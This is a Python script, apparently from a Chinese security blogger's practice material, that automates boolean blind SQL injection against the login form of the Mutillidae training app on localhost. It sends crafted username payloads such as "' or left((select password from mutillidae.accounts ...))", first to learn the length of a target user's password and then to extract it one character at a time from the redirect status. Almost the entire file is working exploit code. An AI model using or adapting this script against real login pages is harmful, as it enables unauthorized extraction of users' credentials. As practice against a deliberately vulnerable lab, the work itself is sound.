# -*- encoding: utf-8 -*-
# time:2020/11/06 15:37:26
# by:crow
# 微信公众号：乌鸦安全
# 个人微信：liuxw7
# sqli-labs 
# sqlmap 
# 盲注
# 
import requests

'''
database=mutillida
table=accounts
select password from mutillidae.accounts where username='admin';  
'''


'''
POST /index.php?page=login.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: http://127.0.0.1
DNT: 1
Connection: close
Referer: http://127.0.0.1/index.php?page=login.php&popUpNotificationCode=LOU1
Cookie: PHPSESSID=11m00s2tgog97qtbp17pq581g7; showhints=1
Upgrade-Insecure-Requests: 1

username=admin&password=&login-php-submit-button=Login
'''


url = 'http://127.0.0.1/index.php?page=login.php'  #  http://127.0.0.1/mutillida/index.php?page=login.php

headers = {
        'Host': '127.0.0.1',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '54',
        'Origin': 'http://127.0.0.1',
        'DNT': '1',
        'Connection': 'close',
        'Referer': 'http://127.0.0.1/index.php?page=login.php&popUpNotificationCode=LOU1', 
        # 'Referer': 'http://127.0.0.1//mutillida/index.php?page=login.php&popUpNotificationCode=LOU1', 
        'Cookie' : 'PHPSESSID=11m00s2tgog97qtbp17pq581g7; showhints=1',
        'Upgrade-Insecure-Requests': '1'
        }


def student__num_length(student_num):
    for i in range(1,100):
        length_payload = "' or length((select password from mutillidae.accounts where username='" + student_num + "'))=" + str(i)  + " #"
        # print(length_payload)

        length_data = {
            'username' : length_payload,
            'password': '',
            'login-php-submit-button':'Login',
        }

        length_r = requests.post(url=url, headers=headers, data=length_data, allow_redirects=False)
        print(length_r.status_code)
        if length_r.status_code == 302:
            print('this database length is {}'.format(i))
            return i 


# get current student_password
def database_name(student__num_length, student_num):
    student_pass = ''
    for i in range(1,student__num_length + 1):
        for j in "qwertyuioplkjhgfdsazxcvbnm0123456789":
            # select password from mutillidae.accounts where username='admin';
            # name_payload = "' or  left(database()," + str(i) +")='" + student_pass + str(j) + "'  #"
            # left((select password from mutillidae.accounts where username='admin'),1)='a'
            # ' or left((select password from mutillidae.accounts where username='admin'),1)='a'#
            name_payload = "' or left((select password from mutillidae.accounts where username='" + student_num+ "')," + str(i) +")='" + student_pass + str(j) + "'  #"

            # print(name_payload)
            name_data = {
            'username' : name_payload,
            'password': '',
            'login-php-submit-button':'Login',
                        }
            name_r = requests.post(url=url, headers=headers, data=name_data, allow_redirects=False)
            if name_r.status_code == 302:
                # print('the student_pass {} is {}'.format(i, j))
                student_pass = student_pass + j 
                break
            if student_pass != '':
                print(student_pass)
    print(student_pass)
    return student_pass

if __name__ == "__main__":
    student_num = 'tim'    # userid
    # get current database length 
    student_L = student__num_length(student_num)  
    student_pass = database_name(student__num_length=student_L, student_num=student_num)






